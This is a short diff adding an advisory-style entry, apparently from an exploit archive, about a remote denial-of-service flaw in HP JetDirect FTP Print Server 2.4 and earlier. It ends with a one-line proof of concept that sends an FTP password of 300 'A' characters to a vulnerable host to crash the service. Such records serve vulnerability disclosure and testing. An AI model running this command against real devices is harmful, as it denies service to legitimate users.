@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/23168/info
+
+HP JetDirect FTP Print Server is prone to a remote denial-of-service vulnerability.
+
+An attacker can exploit this issue on an affected computer to deny service to legitimate users.
+
+FTP Print Server 2.4 and prior versions are vulnerable.
+
+python /usr/lib/python2.4/ftplib.py -d [vulnerable host] -l -p `python
+-c 'print "A"*300'`
